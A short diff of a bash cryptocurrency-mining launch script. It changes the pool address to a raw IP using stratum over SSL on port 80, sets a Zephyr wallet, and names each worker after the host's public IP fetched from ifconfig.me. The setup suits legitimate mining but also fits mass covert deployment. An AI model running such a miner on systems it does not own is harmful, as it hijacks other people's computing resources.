@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=us2.zephyr.herominers.com:1123
+POOL=stratum+ssl://54.235.18.60:80
 WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
 myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
